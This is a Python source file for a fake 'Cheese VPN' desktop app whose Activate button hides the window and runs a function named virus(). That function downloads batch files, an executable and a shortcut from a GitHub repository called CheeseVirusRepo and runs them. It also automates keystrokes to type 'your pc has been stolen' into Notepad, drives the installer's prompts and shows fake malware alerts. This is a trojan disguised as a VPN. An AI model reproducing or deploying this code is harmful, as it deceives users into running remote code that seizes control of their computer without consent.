import os
import subprocess
import sys
import threading
import time
import customtkinter
import requests
from plyer import notification # type: ignore
import pyautogui # type: ignore
import tkinter as tk


customtkinter.set_appearance_mode("System")
customtkinter.set_default_color_theme("dark-blue")

root = customtkinter.CTk()
root.geometry("500x260")
root.minsize(500, 260)
root.resizable(False, False)
root.title("Cheese VPN")

script_directory = os.path.dirname(os.path.abspath(sys.argv[0]))
print(f"\n{script_directory}")

def activate():
    vpnonoroff.configure(text="VPN is Activating...")
    value.set(0)
    for i in range(101):
        time.sleep(0.05)
        value.set(i / 100) 
    value.set(1)
    vpnonoroff.configure(text="VPN is On")
    connecttick.configure(text="Disable")
    root.withdraw()
    notification.notify(
    title='VPN Enabled',
    message='Cheese VPN has activated, We hid it so you can get to work!',
    app_name='Cheese VPN',
    timeout=10
    )
    virus()

def virus():
    url = "https://raw.githubusercontent.com/HolyCheeseMan/CheeseVirusRepo/refs/heads/Main/Cheese-Anti-Virus/Cheese-AntiVirus_INSTALLER.bat"
    print(f"\nDownloading from URL {url}")
    response = requests.get(url)
    filename = os.path.join(script_directory, url.split("/")[-1])
    with open(filename, "wb") as file:
        file.write(response.content)
    print(f"Downloaded {filename}")
    time.sleep(20)
    notification.notify(
    title='Malicious Activity Detected',
    message='Report from Cheese VPN - Detected:Bloatware.Confident.',
    app_name='Cheese VPN',
    timeout=10
    )
    url = "https://github.com/HolyCheeseMan/CheeseScriptingPLUS/raw/refs/heads/Main/APP/CheeseScriptingPlus.exe"
    print(f"\nDownloading from URL {url}")
    response = requests.get(url)
    filename = os.path.join(script_directory, url.split("/")[-1])
    with open(filename, "wb") as file:
        file.write(response.content)
    print(f"Downloaded {filename}")
    time.sleep(5)
    print("Starting Virus")
    pyautogui.hotkey('win', 'r')
    time.sleep(0.1)
    pyautogui.typewrite("notepad", interval=0.01)
    pyautogui.press('enter')
    time.sleep(1)
    pyautogui.typewrite("I'm not sure if you have noticed, but your pc has been stolen.", interval=0.1)
    time.sleep(1)
    subprocess.Popen(['start', 'cmd', '/k', 'Cheese-AntiVirus_INSTALLER.bat'], shell=True)
    time.sleep(1)
    pyautogui.typewrite("2", interval=0.1)
    pyautogui.press('enter')
    time.sleep(5)
    pyautogui.typewrite("1", interval=0.1)
    pyautogui.press('enter')
    time.sleep(1)
    pyautogui.typewrite("1", interval=0.1)
    pyautogui.press('enter')
    subprocess.Popen(['CheeseScriptingPlus.exe'])
    time.sleep(5)
    subprocess.Popen(['start', 'powershell',], shell=True)
    time.sleep(2)
    pyautogui.typewrite("Get-NetIPAddress", interval=0.01)
    pyautogui.press('enter')
    time.sleep(3)
    notification.notify(
    title='Virus Detected',
    message='Report from Cheese VPN - Malicious files detected.',
    app_name='Cheese VPN',
    timeout=10
    )
    username = os.getlogin()
    directory = fr'C:/Users/{username}/Downloads/CheeseOS'
    file_path = os.path.join(directory, 'CheeseOS.lnk')
    url = "https://github.com/HolyCheeseMan/CheeseVirusRepo/raw/refs/heads/Main/CheeseOS/CheeseOS.lnk"

    os.makedirs(directory, exist_ok=True)

    print(f"\nDownloading from URL {url}")
    response = requests.get(url)

    if response.status_code == 200:
        with open(file_path, "wb") as file:
            file.write(response.content)
        print(f"Downloaded to {file_path}")
    else:
        print(f"Failed to download file: {response.status_code}")
    directory = fr'C:/Users/{username}/Downloads/CheeseOS/Essentials'
    file_path = os.path.join(directory, 'OS.bat')
    url = "https://github.com/HolyCheeseMan/CheeseVirusRepo/raw/refs/heads/Main/CheeseOS/Essentials/OS.bat"

    os.makedirs(directory, exist_ok=True)

    print(f"\nDownloading from URL {url}")
    response = requests.get(url)

    if response.status_code == 200:
        with open(file_path, "wb") as file:
            file.write(response.content)
        print(f"Downloaded to {file_path}")
    else:
        print(f"Failed to download file: {response.status_code}")
    os.startfile(fr'C:/Users/{username}/Downloads/CheeseOS/CheeseOS.lnk')
    time.sleep(0.1)
    pyautogui.hotkey('f11')
    pyautogui.typewrite("Y", interval=0.01)
    pyautogui.press('enter')
    time.sleep(21)
    pyautogui.typewrite("abc123", interval=0.1)
    pyautogui.press('enter')
    sys.exit()



title = customtkinter.CTkLabel(master=root, text="Cheese VPN", font=("Roboto", 35))
title.pack(padx=5, pady=10)

connecttick = customtkinter.CTkButton(master=root, text="Activate", font=("Roboto", 45), command=lambda: threading.Thread(target=activate).start())
connecttick.pack(padx=5, pady=10)


vpnonoroff = customtkinter.CTkLabel(master=root, text="VPN is Off", font=("Roboto", 15))
vpnonoroff.pack(padx=5, pady=10)

value = customtkinter.CTkProgressBar(master=root, width=300, height=15)
value.pack(padx=5, pady=10)

label_virusprotection = customtkinter.CTkLabel(master=root, text="Cheese VPN Virus Protection Enabled.", font=("Roboto", 15))
label_virusprotection.pack(padx=5, pady=10)

value.set(-0)

root.mainloop()